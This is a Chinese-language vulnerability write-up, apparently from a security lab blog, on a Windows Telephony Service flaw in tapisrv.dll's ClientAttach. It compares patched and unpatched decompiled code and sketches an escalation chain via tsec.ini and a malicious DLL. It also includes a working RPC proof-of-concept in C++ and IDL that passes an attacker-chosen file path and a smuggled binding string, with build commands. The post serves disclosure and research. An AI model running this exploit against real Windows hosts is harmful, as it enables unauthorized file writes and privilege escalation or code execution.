#  CVE-2026-20931 Windows 电话服务漏洞分析  
原创 毕方安全实验室
                    毕方安全实验室  BeFun安全实验室   2026-01-26 09:22  
  
# 漏洞分析  
  
微软在1月修复了一个电话服务的漏洞，位于tapisrv.dll  
的ClientAttach  
函数，以下是补丁，修复前：  
```
v40 = CreateFileW(lpFileName: v34, dwDesiredAccess: 0x40000000u, dwShareMode: 1u, lpSecurityAttributes: 0, dwCreationDisposition: 3u, dwFlagsAndAttributes: 0x80u, hTemplateFile: 0);pClientCtx->hFile = v40;if ( v40 != (HANDLE)-1LL )    goto LABEL_154;v41 = GetLastError();TRACELogPrint(unk: 65538, unk: "ClientAttach: CreateFile(%ws) failed, err=%u", v34, v41);
```  
  
修复后：  
```
MaxMessageSize[0] = 0;NextSize[0] = 0;MessageCount[0] = 0;TokenIsMember = 0;FileW = CreateFileW(lpFileName: v34, dwDesiredAccess: 0x40000000u, dwShareMode: 1u, lpSecurityAttributes: 0, dwCreationDisposition: 3u, dwFlagsAndAttributes: 0x80u, hTemplateFile: 0);pClientCtx->hFile = FileW;if ( FileW != (HANDLE)-1LL    && GetMailslotInfo(hMailslot: FileW, lpMaxMessageSize: MaxMessageSize, lpNextSize: NextSize, lpMessageCount: MessageCount, lpReadTimeout: (LPDWORD)&TokenIsMember) ){    goto LABEL_154;}hFile = pClientCtx->hFile;if ( hFile == (HANDLE)-1LL ){    v38 = "ClientAttach: CreateFile(%ws) failed, err=%u";}else{    CloseHandle(hObject: hFile);    pClientCtx->hFile = (HANDLE)-1LL;    v38 = "ClientAttach: GetMailslotInfo(%ws) failed, err=%u";}v39 = GetLastError();TRACELogPrint(unk: 65538, unk: v38, v34, v39);
```  
  
简单来说就是CreateFileW  
的参数lpFileName  
可以被用户控制，没有检查这个参数是不是mail slot  
导致可以以NETWORK SERVICE  
权限进行任意文件读写。而修复后的代码调用了GetMailslotInfo  
函数进了检查。  
## 利用  
  
必须开启TAPI  
的server mode  
，新版本Windows下默认都是关闭的。作者利用这个漏洞往C:\Windows\TAPI\tsec.ini  
文件的[TapiAdministrators]  
条目下写入用户名，然后利用GetUIDllName  
函数加载恶意DLL进而实现RCE或者LPE。  
## POC  
  
tapsrv.idl：  
```
[    uuid(2f5f6520-ca46-1067-b319-00dd010662da),    version(1.0)]interface tapsrv{    typedef [context_handle] void *PCONTEXT_HANDLE_TYPE;    long ClientAttach(     [out]   PCONTEXT_HANDLE_TYPE *pphContext,     [in]    long    lProcessID,     [out]   long   *phAsyncEventsEvent,     [in, string]    wchar_t *pszDomainUser,     [in, string]    wchar_t *pszMachine    );    long ClientRequest(        [in] PCONTEXT_HANDLE_TYPE phContext,        [in, size_is(lInBufferSize)] unsigned char *pInBuffer,        [in] long lInBufferSize,        [out, size_is(lOutBufferSize)] unsigned char *pOutBuffer,        [in] long lOutBufferSize    );    void ClientDetach(        [in, out] PCONTEXT_HANDLE_TYPE *pphContext    );}
```  
  
poc.cpp：  
```
#include <windows.h>#include <stdio.h>#include <rpc.h>#include <rpcdce.h>#include "tapsrv.h"#pragma comment(lib, "rpcrt4.lib")// Memory allocation for RPCvoid* __RPC_USER midl_user_allocate(size_t size) {    returnmalloc(size);}void __RPC_USER midl_user_free(void* p) {    free(p);}typedefstruct {    wchar_t* protseq;    wchar_t* endpoint;} ProtocolInfo;// Global handle definition required by implicit_handle in ACFhandle_t tapisrv_IfHandle = 0;int main(){    RPC_STATUS status;    RPC_WSTR pszStringBinding = NULL;    handle_t hBinding = NULL;    RPC_WSTR serverPrincName = NULL;    wchar_t computerName[256];    DWORD size = 256;    GetComputerNameW(computerName, &size);    wchar_t spn[512];    swprintf_s(spn, 512, L"HOST/%s", computerName);    printf("[*] Constructed SPN: %ls\n", spn);    // Target file    wchar_t* pszDomainUser = (wchar_t*)L"C:\\Windows\\System32\\drivers\\etc\\hosts";     wchar_t* pszMachine = (wchar_t*)L"127.0.0.1\"ncacn_np\"\\pipe\\tapsrv";    PCONTEXT_HANDLE_TYPE hContext = NULL;    long lProcessID = -1;     long hAsyncEventsEvent = 0;    // Use ncacn_np as it is the standard remote path    RPC_WSTR protseq = (RPC_WSTR)L"ncacn_np";    RPC_WSTR endpoint = (RPC_WSTR)L"\\pipe\\tapsrv";    printf("\n[=] Connecting to %ls:%ls\n", protseq, endpoint);    status = RpcStringBindingComposeW(NULL, protseq, NULL, endpoint, NULL, &pszStringBinding);    if (status) { printf("Compose failed: %d\n", status); return1; }        status = RpcBindingFromStringBindingW(pszStringBinding, &hBinding);    RpcStringFreeW(&pszStringBinding);    if (status) { printf("Bind failed: %d\n", status); return1; }    // IMPORTANT: Set the implicit handle defined in IDL    tapisrv_IfHandle = hBinding;    // Try Negotiate with Impersonation    RPC_SECURITY_QOS qos;    qos.Version = RPC_C_SECURITY_QOS_VERSION;    qos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;    qos.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;    qos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;    printf("[*] Setting Auth Info (Negotiate, Privacy, Impersonate)...\n");    status = RpcBindingSetAuthInfoExW(        hBinding,        (RPC_WSTR)spn, // Try Constructed SPN        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,         RPC_C_AUTHN_GSS_NEGOTIATE,        NULL,         0,         &qos    );    if (status) {        printf("[-] RpcBindingSetAuthInfoExW failed: %d\n", status);        return1;    }    printf("[*] Calling ClientAttach...\n");    RpcTryExcept {        long result = ClientAttach(            &hContext,            lProcessID,            &hAsyncEventsEvent,            pszDomainUser,            pszMachine        );        if (result == 0) printf("\n    [!!!] SUCCESS! Result: 0x%x\n", result);        elseprintf("\n    [+] REACHED! Result: 0x%x\n", result);    }    RpcExcept(1) {        printf("[-] RPC Exception: %d (0x%x)\n", RpcExceptionCode(), RpcExceptionCode());    }    RpcEndExcept    RpcBindingFree(&hBinding);    return0;}
```  
  
编译运行：  
```
midl tapsrv.idl /acf tapsrv.acfcl exploit_lpe.cpp tapsrv_c.c /link rpcrt4.lib advapi32.lib user32.lib
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/g1ibHIZnnGxy1DmsLE7ZFdFy3fJ4ekjevZLtfZbFMicDty8TzOiaVDVqIiaPfjunwwofFyreRuX1Qc0By2hcCWIfBg/640?wx_fmt=png&from=appmsg "")  
## 参考  
- Who’s on the Line? Exploiting RCE in Windows Telephony Service (https://swarm.ptsecurity.com/whos-on-the-line-exploiting-rce-in-windows-telephony-service/)  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g1ibHIZnnGxypqEx4bANibZZszjF6wpe7ZPA7yLthldTWV2lxckzaFiaaEDE7MVTjS1fibaJz7tibMoSVAjXrYPGNOA/640?wx_fmt=png "")  
  
  
  
